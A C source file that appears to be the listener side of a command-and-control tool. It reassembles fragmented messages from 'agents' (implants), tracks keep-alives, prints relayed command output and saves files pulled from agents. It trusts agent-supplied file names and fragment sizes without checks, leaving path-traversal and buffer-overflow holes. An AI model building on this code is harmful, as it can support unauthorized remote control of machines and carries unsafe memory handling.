/*
message_handler.c

This file is responsible for the following:
* fragmenting messages that are being sent out
* assembling fragmented messages from agents
* handling alive messages
* passing messages to and from console

*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <stdbool.h>
#include <signal.h>

#include <arpa/inet.h>

#include "utility.h"
#include "queue.h"
#include "implant.h"
#include "base.h"
#include "listener_handler.h"

// Globals
// Receive Queue
extern Queue* listener_receive_queue;
extern pthread_mutex_t listener_receive_queue_lock;
// Send Queue
extern Queue* listener_send_queue;
extern pthread_mutex_t listener_send_queue_lock;
// SIGINT flag
extern volatile sig_atomic_t all_sigint;
extern volatile sig_atomic_t shell_sigint;

STATIC int listener_handle_command(Agent* agent){
	print_out("%s\n", agent->message);

	return RET_OK;
}

STATIC int listener_handle_get_file_name(Agent* agent){

	agent->file_name = agent->message;
	agent->message = NULL;

	debug_print("Get file name: %s\n", agent->file_name);

	return RET_OK;
}

STATIC int listener_handle_get_file(Agent* agent){
	FILE* file_fd;

	printf("JUJU: %s\n", agent->file_name);
	if ((file_fd = fopen(agent->file_name, "wb")) == 0){
		printf("ERROR file open\n");
		return RET_ERROR;
	}

	if (writeall(file_fd, agent->message, agent->last_header.total_size) != RET_OK){
		printf("ERROR fwrite\n");
		return RET_ERROR;
	}

	debug_print("Get file: %s, size: %d\n", agent->file_name, agent->last_header.total_size);

	fclose(file_fd);
	free(agent->message);
	free(agent->file_name);
	agent->message = NULL;
	agent->file_name = NULL;

	return RET_OK;
}

STATIC int listener_parse_first_fragment(Agent* agent, Fragment* fragment, int32_t size){

	// check if this is a first fragment
	if (fragment->header.index != 0){
		debug_print("Expected first fragment but got: %d\n", fragment->header.index);
		return RET_ORDER;
	}

	// check if this fragment contains no data
	if (size != HEADER_SIZE){
		debug_print("Expected first fragment size 0 but got: %d\n", size);
		return RET_ORDER;
	}

	debug_print("Handling first fragment: type: %d\n", fragment->header.type);

	// save fragment to agent struct
	memcpy(&agent->last_header, fragment, HEADER_SIZE);
	
	// allocate memory for total message
	agent->message = calloc(1, fragment->header.total_size);
	
	// record current size of message
	agent->current_message_size = 0;

	return RET_OK;
}

STATIC int listener_parse_next_fragment(Agent* agent, Fragment* fragment, int size){

	// check if this fragment matches the next expected sized
	if (size - HEADER_SIZE != agent->last_header.next_size){
		debug_print("Expected fragment size: %d, but got: %d\n", size - HEADER_SIZE, agent->last_header.next_size);
		return RET_ORDER;
	}

	// check if type, checksum, and index match
	if (fragment->header.type != agent->last_header.type || \
		fragment->header.checksum != agent->last_header.checksum || \
		fragment->header.index != agent->last_header.index + 1){
		debug_print("Unexpected fragment: type: %d, checksum: %d, index: %d\n", \
			fragment->header.type, \
			fragment->header.checksum, \
			fragment->header.index);
		return RET_ORDER;
	}
	
	// copy payload to end of message buffer
	memcpy(agent->message + agent->current_message_size, fragment->buffer, agent->last_header.next_size);
	
	// update current size of message
	agent->current_message_size += agent->last_header.next_size;

	// update agent's last header
	memcpy(&agent->last_header, fragment, HEADER_SIZE);

	return RET_OK;
}

STATIC int listener_handle_complete_message(Agent* agent){
	int ret_val = RET_OK;
	
	// check if we received all fragments
	if (agent->last_header.index == -1 || agent->last_header.total_size != agent->current_message_size){
		return ret_val;
	}

	// check if checksum matches message
	//TODO

	switch(agent->last_header.type){
		case TYPE_COMMAND:
			listener_handle_command(agent);
			break;
		case TYPE_GET_FILE_NAME:
			listener_handle_get_file_name(agent);
			break;
		case TYPE_GET_FILE:
			listener_handle_get_file(agent);
			break;
		default:
			printf("ERROR UNKNOWN MESSAGE TYPE: %d\n", agent->last_header.type);
			ret_val = RET_ERROR;
	}

	// we are done processing message, reset agent index
	agent->last_header.index = -1;

	return ret_val;
}

STATIC int listener_handle_message_fragment(Agent* agent, Queue_Message* q_message){
	int retval;

	// handle message type other than keep alive
	if (agent->last_header.index == -1){
		retval = listener_parse_first_fragment(agent, q_message->fragment, q_message->size);
	}
	else{
		retval = listener_parse_next_fragment(agent, q_message->fragment, q_message->size);
	}

	return retval;
}

STATIC int listener_handle_message(Connected_Agents* CA){
	int retval = RET_OK;
	Queue_Message* q_message;
	Agent* agent;

	if (!(q_message = dequeue(listener_receive_queue, &listener_receive_queue_lock))) return RET_OK;
	debug_print("taking message off queue: id: %d, size: %d\n", q_message->id, q_message->size);

	agent = &CA->agents[q_message->id];

	pthread_mutex_lock(&CA->lock);
	// check if socket file descriptor was removed from agents global variable
	if (!agent->alive){
		pthread_mutex_unlock(&CA->lock);
		debug_print("%s\n", "agent was disconnected");
		return RET_OK;
	}

	// if type is alive packet, update keep alive parameter
	if (q_message->fragment->header.type == TYPE_ALIVE){
		CA->agents[q_message->id].alive = (unsigned int)time(NULL);
		pthread_mutex_unlock(&CA->lock);
		debug_print("Agent %d is alive: %u seconds\n", q_message->id, q_message->fragment->header.alive_time);
		return RET_OK;
	}

	retval = listener_handle_message_fragment(agent, q_message);
	if (retval == RET_ORDER){
		pthread_mutex_unlock(&CA->lock);
		agent->last_header.index = -1;
		return RET_OK;
	}
	
	retval = listener_handle_complete_message(agent);
	pthread_mutex_unlock(&CA->lock);

	free(q_message->fragment);
	free(q_message);
	return retval;
}

int listener_prepare_message(int sockfd, int type, char* message, int message_size){
	Queue_Message* q_message;
	Fragment* fragment;
	int bytes_sent = 0, index = 0;
	int this_size, next_size;

	// prepare first fragment. Only purpose is to prepare for next fragment size
	fragment = calloc(1, sizeof(Fragment));
	fragment->header.type = type;
	fragment->header.index = index++;
	fragment->header.total_size = message_size;
	fragment->header.checksum = 0;							// TODO
	
	next_size = message_size < PAYLOAD_SIZE ? message_size : PAYLOAD_SIZE;
	fragment->header.next_size = next_size;
	
	q_message = malloc(sizeof(Queue_Message));
	q_message->id = sockfd;
	q_message->size = HEADER_SIZE;
	q_message->fragment = fragment;

	enqueue(listener_send_queue, &listener_send_queue_lock, q_message);
	
	while (next_size > 0){
		this_size = next_size;

		// send remaining fragments
		fragment = calloc(1, sizeof(Fragment));
		fragment->header.type = type;
		fragment->header.index = index++;
		fragment->header.total_size = message_size;
		fragment->header.checksum = 0;							// TODO

		next_size = (message_size - (bytes_sent + next_size)) < PAYLOAD_SIZE ? (message_size - (bytes_sent + next_size)) : PAYLOAD_SIZE;
		fragment->header.next_size = next_size;
		memcpy(fragment->buffer, message + bytes_sent, this_size);
		
		q_message = malloc(sizeof(Queue_Message));
		q_message->id = sockfd;
		q_message->size = HEADER_SIZE + this_size;
		q_message->fragment = fragment;

		enqueue(listener_send_queue, &listener_send_queue_lock, q_message);
		bytes_sent += this_size;
	}
	
	free(message);
	return 0;
}

void *listener_handler_thread(void *vargp){
	Connected_Agents* CA = vargp;

	while(!all_sigint){
		if (listener_handle_message(CA) != RET_OK){
			printf("ERROR listener_handler_thread\n");
			all_sigint = true;
		}
	}

	debug_print("%s\n", "listener_handler_thread done");
	return 0;
}